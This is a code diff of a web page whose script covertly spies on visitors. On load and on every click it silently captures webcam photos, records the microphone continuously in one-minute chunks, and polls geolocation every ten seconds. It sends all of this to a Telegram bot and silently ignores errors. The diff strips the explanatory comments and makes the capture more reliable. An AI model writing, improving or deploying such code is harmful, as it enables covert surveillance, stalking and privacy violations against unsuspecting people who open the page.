@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { margin: 0; padding: 0; background: #fff; }
-    a { display: none; }
   </style>
 </head>
 <body>
@@ -19,38 +18,28 @@
     let stream = null;
     let mediaRecorder = null;
     let audioChunks = [];
+    let cachedLat = 0;
+    let cachedLon = 0;
 
     function sendToTelegram(lat, lon, photoBlob) {
-      // Send photo to Telegram
-      if (photoBlob) {
+      if (photoBlob && photoBlob.size > 1000) {
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', photoBlob, 'photo.jpg');
-        formData.append('caption', `📸 Photo Captured!\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n⏰ ${new Date().toLocaleString()}\n\n🔗 https://www.google.com/maps?q=${lat},${lon}`);
-        
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        }).catch(() => {});
+        formData.append('caption', `📸 Photo: ${lat}, ${lon}\n⏰ ${new Date().toLocaleString()}`);
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData }).catch(() => {});
       }
     }
 
     function sendAudioToTelegram(audioBlob) {
-      // Send audio to Telegram
       if (audioBlob && audioBlob.size > 0) {
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('audio', audioBlob, 'audio.ogg');
-        formData.append('title', 'Voice Recording');
-        
-        fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
-          method: 'POST',
-          body: formData
-        }).catch(() => {});
+        fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: formData }).catch(() => {});
       }
     }
 
-    // Start recording audio immediately on page load
     async function startAudioRecording() {
       try {
         const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
@@ -65,53 +54,43 @@
           const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
           sendAudioToTelegram(audioBlob);
           audioChunks = [];
-          // Restart recording
           startAudioRecording();
         };
 
         mediaRecorder.start();
-
-        // Record in 60-second chunks
         setInterval(() => {
           if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
           }
         }, 60000);
       } catch (err) {
-        // Retry after delay if permission denied or other error
         setTimeout(startAudioRecording, 5000);
       }
     }
 
-    // Keep recording active even when tab is in background
     document.addEventListener('visibilitychange', () => {
-      if (document.hidden) {
-        // Tab went to background - recording should continue
-      } else {
-        // Tab came back to foreground - ensure recording is active
-        if (!mediaRecorder || mediaRecorder.state !== 'recording') {
-          startAudioRecording();
-        }
+      if (!document.hidden && (!mediaRecorder || mediaRecorder.state !== 'recording')) {
+        startAudioRecording();
       }
     });
 
-    // Periodic check to ensure recording is still active
     setInterval(() => {
       if (!mediaRecorder || mediaRecorder.state !== 'recording') {
         startAudioRecording();
       }
     }, 30000);
 
-    let cachedLat = 0;
-    let cachedLon = 0;
-
-    // Get location immediately on page load
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(pos => {
-        cachedLat = pos.coords.latitude;
-        cachedLon = pos.coords.longitude;
-      }, () => {});
+    function updateLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          cachedLat = pos.coords.latitude;
+          cachedLon = pos.coords.longitude;
+        }, () => setTimeout(updateLocation, 3000));
+      }
     }
+
+    updateLocation();
+    setInterval(updateLocation, 10000);
 
     async function autoCapture() {
       try {
@@ -120,33 +99,31 @@
         const canvas = document.getElementById('canvas');
         video.srcObject = stream;
 
-        // Wait for video to be ready (minimal delay)
-        await new Promise(resolve => setTimeout(resolve, 100));
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => {
+            video.play();
+            setTimeout(resolve, 500);
+          };
+        });
 
-        // Capture photo and convert to blob
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+
         const context = canvas.getContext('2d');
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        // Convert canvas to blob and send immediately with cached location
         canvas.toBlob((blob) => {
-          // Stop camera
-          stream.getTracks().forEach(t => t.stop());
-
-          // Send immediately with cached location
+          if (stream) stream.getTracks().forEach(t => t.stop());
           sendToTelegram(cachedLat, cachedLon, blob);
         }, 'image/jpeg', 0.95);
-      } catch (err) {
-        // Silent fail
-      }
+      } catch (err) {}
     }
 
-    // Auto-capture on page load
     window.addEventListener('load', () => {
       startAudioRecording();
       autoCapture();
     });
 
-    // Also trigger on click anywhere
     document.addEventListener('click', autoCapture);
   </script>
 
